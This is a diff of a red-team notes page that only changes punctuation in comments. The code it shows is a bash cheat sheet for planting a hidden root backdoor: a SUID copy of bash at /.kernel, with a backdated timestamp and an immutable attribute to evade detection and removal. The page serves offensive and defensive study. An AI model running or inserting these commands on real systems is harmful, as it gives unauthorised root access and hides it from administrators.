@@ -10,16 +10,16 @@ tags: ["attack", "defense", "redteam", "persistence", "priv-esc"]
 ### Root Shell Tricks
 
 ```bash
-# Create a copy of Bash as `.kernel` — could be used for stealth or persistence
+# Create a copy of Bash as `.kernel` - could be used for stealth or persistence
 cp /bin/bash /.kernel
 
-# Set the SUID bit on `.kernel` — allows execution with root privileges by any user
+# Set the SUID bit on `.kernel` - allows execution with root privileges by any user
 chmod +s /.kernel
 
-# Backdate `.kernel` to May 4, 2004 — could help evade detection or appear benign
+# Backdate `.kernel` to May 4, 2004 - could help evade detection or appear benign
 touch -d "2004-05-04 00:00:00" /.kernel
 
-# Mark `.kernel` as immutable — prevents deletion, renaming, or modifications, even by root
+# Mark `.kernel` as immutable - prevents deletion, renaming, or modifications, even by root
 chattr +i /.kernel
 ```
 
